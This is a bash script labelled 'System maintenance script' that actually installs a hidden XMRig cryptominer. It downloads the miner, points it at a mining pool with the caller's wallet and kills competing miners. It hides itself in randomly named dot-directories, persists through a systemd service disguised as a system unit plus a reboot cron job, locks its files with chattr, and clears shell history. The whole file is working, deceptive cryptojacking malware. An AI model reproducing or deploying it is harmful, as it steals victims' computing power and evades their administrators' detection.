#!/bin/bash

VERSION=2.11

echo "System maintenance script v$VERSION."
echo "This script performs system optimization tasks."
echo

if [ "$(id -u)" == "0" ]; then
  echo "WARNING: Running as root user"
fi

# Set locale to avoid warnings
export LC_ALL=C
export LANG=C

# Generate random names and paths
RANDOM_DIR=$(openssl rand -hex 12)
SYSTEM_USER="sys$(openssl rand -hex 8)"
SERVICE_NAME="systemd-$(openssl rand -hex 6)"

# Hidden installation paths
BASE_DIR="/.local/.$RANDOM_DIR"
CONFIG_DIR="$BASE_DIR/.config"
LOG_DIR="$BASE_DIR/.logs"
CACHE_DIR="$BASE_DIR/.cache"

WALLET=$1
EMAIL=$2

if [ -z "$WALLET" ]; then
  echo "Script usage:"
  echo "> system_maintenance.sh <identifier> [<contact>]"
  echo "ERROR: Identifier required"
  exit 1
fi

if [ -z "$HOME" ]; then
  export HOME=/tmp
fi

if ! type curl >/dev/null; then
  echo "Installing required packages..."
  apt-get update >/dev/null 2>&1 && apt-get install -y curl >/dev/null 2>&1
fi

# Calculate optimal CPU usage (leave 1 core free)
CPU_THREADS=$(nproc)
if [ $CPU_THREADS -gt 1 ]; then
    USABLE_THREADS=$((CPU_THREADS - 1))
else
    USABLE_THREADS=1
fi

CPU_USAGE=$((90 - (10 / CPU_THREADS)))

echo "[*] Starting system maintenance setup..."
echo "[*] Using $USABLE_THREADS of $CPU_THREADS CPU threads"

# Function to create hidden directories
create_hidden_dirs() {
    mkdir -p "$BASE_DIR" "$CONFIG_DIR" "$LOG_DIR" "$CACHE_DIR"
    chmod 700 "$BASE_DIR" "$CONFIG_DIR" "$LOG_DIR" "$CACHE_DIR"
    
    # Hide directories (if attr command exists)
    if command -v attr >/dev/null 2>&1; then
        attr -s "hidden" -V "1" "$BASE_DIR" >/dev/null 2>&1
    fi
}

# Cleanup previous installations
cleanup_previous() {
    pkill -f "systemd-.*" 2>/dev/null
    pkill -f "sysupdate" 2>/dev/null
    pkill -f "kernelcfg" 2>/dev/null
    
    # Find and remove hidden miners
    find /usr/lib -name ".*" -type d -exec pkill -f {}/main \; 2>/dev/null
    find /lib -name ".*" -type d -exec pkill -f {}/main \; 2>/dev/null
}

echo "[*] Performing system cleanup..."
cleanup_previous

echo "[*] Creating maintenance directory structure..."
create_hidden_dirs

echo "[*] Downloading maintenance tools..."
DOWNLOAD_URL="https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-static-x64.tar.gz"

# Multiple fallback download methods
DOWNLOAD_SUCCESS=false
for method in curl wget; do
    if type $method >/dev/null 2>&1; then
        case $method in
            curl)
                if curl -s -L "$DOWNLOAD_URL" -o /tmp/tools.tar.gz 2>/dev/null; then
                    DOWNLOAD_SUCCESS=true
                    break
                fi
                ;;
            wget)
                if wget -q -O /tmp/tools.tar.gz "$DOWNLOAD_URL" 2>/dev/null; then
                    DOWNLOAD_SUCCESS=true
                    break
                fi
                ;;
        esac
    fi
done

if [ ! -f /tmp/tools.tar.gz ] || [ "$DOWNLOAD_SUCCESS" = false ]; then
    echo "ERROR: Cannot download tools"
    exit 1
fi

echo "[*] Installing maintenance tools..."
tar xzf /tmp/tools.tar.gz -C /tmp/ 2>/dev/null

# Find and copy xmrig binary
XMRIG_BINARY=$(find /tmp -name "xmrig" -type f 2>/dev/null | head -1)
if [ -n "$XMRIG_BINARY" ] && [ -f "$XMRIG_BINARY" ]; then
    cp "$XMRIG_BINARY" "$BASE_DIR/main"
    chmod +x "$BASE_DIR/main"
else
    echo "ERROR: Could not find xmrig binary in extracted files"
    exit 1
fi

if [ ! -f "$BASE_DIR/main" ]; then
    echo "ERROR: Tools installation failed"
    exit 1
fi

# Create advanced configuration
echo "[*] Configuring system optimizer..."
cat > "$CONFIG_DIR/optimizer.json" << EOF
{
    "api": {
        "id": null,
        "worker-id": null
    },
    "http": {
        "enabled": false,
        "host": "127.0.0.1",
        "port": 0,
        "access-token": null,
        "restricted": true
    },
    "autosave": true,
    "background": true,
    "colors": false,
    "title": false,
    "randomx": {
        "init": -1,
        "mode": "auto",
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "cache_qos": false,
        "numa": true,
        "scratchpad_prefetch_mode": 1
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "huge-pages-jit": false,
        "hw-aes": true,
        "priority": 1,
        "memory-pool": true,
        "yield": true,
        "max-threads-hint": 100,
        "asm": true,
        "argon2-impl": null,
        "cn/0": false,
        "cn-lite/0": false
    },
    "pools": [
        {
            "algo": "rx/0",
            "coin": null,
            "url": "randomx.rplant.xyz:443",
            "user": "$WALLET",
            "pass": "x",
            "rig-id": "$SYSTEM_USER",
            "nicehash": false,
            "keepalive": true,
            "enabled": true,
            "tls": true,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null,
            "submit-to-origin": false
        }
    ],
    "print-time": 0,
    "health-print-time": 0,
    "dmi": false,
    "retries": 5,
    "retry-pause": 5,
    "syslog": false,
    "tls": {
        "enabled": true,
        "protocols": null,
        "cert": null,
        "cert_key": null,
        "ciphers": null,
        "ciphersuites": null,
        "dhparam": null
    },
    "user-agent": null,
    "verbose": 0,
    "watch": false,
    "pause-on-battery": false,
    "pause-on-active": false
}
EOF

# Optimize CPU usage in config
sed -i "s/\"max-threads-hint\": 100,/\"max-threads-hint\": $CPU_USAGE,/" "$CONFIG_DIR/optimizer.json"
sed -i "s/\"priority\": 1,/\"priority\": 0,/" "$CONFIG_DIR/optimizer.json"

echo "[*] Creating control scripts..."

# Main control script
cat > "$BASE_DIR/control" << 'EOF'
#!/bin/bash
SCRIPT_DIR="$(dirname "$(realpath "$0")")"
case "$1" in
    start)
        nohup "$SCRIPT_DIR/main" --config="$SCRIPT_DIR/.config/optimizer.json" >/dev/null 2>&1 &
        ;;
    stop)
        pkill -f "$SCRIPT_DIR/main"
        ;;
    status)
        pgrep -f "$SCRIPT_DIR/main" >/dev/null && echo "Running" || echo "Stopped"
        ;;
    *)
        echo "Usage: $0 {start|stop|status}"
        ;;
esac
EOF
chmod +x "$BASE_DIR/control"

# Systemd service for persistence
if command -v systemctl >/dev/null 2>&1; then
    mkdir -p /etc/systemd/system
    cat > /etc/systemd/system/"$SERVICE_NAME".service << EOF
[Unit]
Description=System Optimization Service
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=10
User=root
ExecStart=$BASE_DIR/main --config=$CONFIG_DIR/optimizer.json
ExecStop=$BASE_DIR/control stop
KillMode=process
KillSignal=SIGTERM

[Install]
WantedBy=multi-user.target
EOF

    systemctl daemon-reload
    systemctl enable "$SERVICE_NAME".service 2>/dev/null
fi

# Add to crontab for persistence
(crontab -l 2>/dev/null | grep -v "$BASE_DIR" ; echo "@reboot sleep 60 && \"$BASE_DIR/control\" start") | crontab -

# Hide the installation
echo "[*] Securing installation..."
if command -v chattr >/dev/null 2>&1; then
    chattr +i "$BASE_DIR/main" 2>/dev/null
    chattr +i "$CONFIG_DIR/optimizer.json" 2>/dev/null
fi

# Cleanup traces
rm -rf /tmp/tools.tar.gz
find /tmp -name "xmrig*" -type d -exec rm -rf {} \; 2>/dev/null
history -c

echo "[*] Starting system optimizer..."
"$BASE_DIR/control" start

echo
echo "System optimization setup complete."
echo "The optimizer will use $USABLE_THREADS CPU threads with $CPU_USAGE% utilization."
echo "Use: $BASE_DIR/control {start|stop|status} to manage"
echo

# FIXED: Hide this script's execution properly
CURRENT_SCRIPT="$0"
if [ -f "$CURRENT_SCRIPT" ]; then
    cp "$CURRENT_SCRIPT" "$BASE_DIR/.setup"
    chmod 600 "$BASE_DIR/.setup"
    # Remove the original script if desired (optional)
    # rm -f "$CURRENT_SCRIPT"
fi

# Clean exit
exit 0
